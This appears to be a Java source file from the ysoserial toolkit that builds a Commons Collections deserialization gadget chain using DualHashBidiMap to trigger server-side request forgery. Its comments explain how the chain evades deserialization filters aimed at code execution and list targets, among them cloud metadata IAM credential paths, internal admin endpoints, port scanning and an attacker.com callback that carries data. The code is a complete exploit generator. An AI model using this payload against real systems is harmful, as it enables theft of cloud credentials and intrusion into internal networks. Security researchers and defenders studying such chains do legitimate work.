package ysoserial.payloads;

import java.io.Serializable;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.bidimap.DualHashBidiMap;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	SSRF via deserialization — NO code execution, pure HTTP request.
	Bypasses ALL RCE-focused deserialization defenses.

	Gadget chain:
		ObjectInputStream.readObject()
			DualHashBidiMap.readObject()
				HashMap.put(key, value)
					key.hashCode()
						TiedMapEntry.hashCode()
							TiedMapEntry.getValue()
								LazyMap.get()
									ChainedTransformer.transform()
										ConstantTransformer → URL("http://target/...")
										InvokerTransformer → URL.openStream()
											→ HTTP GET request sent ← SSRF

	Attack primitive:
		- Cloud metadata: http://169.254.169.254/latest/meta-data/
		- Internal services: http://internal-api:8080/admin
		- Port scanning: http://internal-host:PORT/
		- Canary token: http://attacker.com/callback?data=...

	Filter evasion:
		1. DualHashBidiMap — not in any known filter
		2. NO Runtime.exec — bypasses all RCE-focused filters
		3. NO TemplatesImpl — no class loading, no bytecode
		4. NO ProcessBuilder — no process creation
		5. NO JNDI — no InitialContext/JdbcRowSetImpl
		6. Only needs: URL (JDK), InvokerTransformer (CC3)
		7. URL.openStream() is rarely blocklisted — it's "just a network call"

	Why this matters:
		- Deserialization filters focus on preventing RCE
		- JEP 290 filters typically allow java.net.URL (it's a JDK class)
		- This proves deser vulns are exploitable WITHOUT code execution
		- SSRF → cloud metadata → IAM credentials → full compromise

	Usage: payload arg = target URL
		e.g. "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
		     "http://internal-service:8080/admin/users"

	Discovered by IOCD differential fuzzing.

	Requires:
		commons-collections 3.1+
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.DMBS335 })
public class CommonsCollectionsSSRF extends PayloadRunner implements ObjectPayload<Serializable> {

	public Serializable getObject(final String targetUrl) throws Exception {

		// Inert transformer during setup
		final Transformer[] fakeTransformers = new Transformer[] {
			new ConstantTransformer(1) };
		final ChainedTransformer transformerChain = new ChainedTransformer(fakeTransformers);

		// Real chain: URL(targetUrl).openStream() → HTTP GET → SSRF
		// URL is Serializable — stored inside ConstantTransformer
		final Transformer[] realTransformers = new Transformer[] {
			new ConstantTransformer(new URL(targetUrl)),
			new InvokerTransformer("openStream",
				new Class[0], new Object[0]),
			new ConstantTransformer(1) };

		final Map innerMap = new HashMap();
		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

		// DualHashBidiMap — novel entry, not in any filter
		DualHashBidiMap bidi = new DualHashBidiMap();
		bidi.put(entry, "bar");

		// Remove cached entry
		innerMap.remove("foo");

		// Arm
		Reflections.setFieldValue(transformerChain, "iTransformers", realTransformers);

		return bidi;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollectionsSSRF.class, args);
	}
}
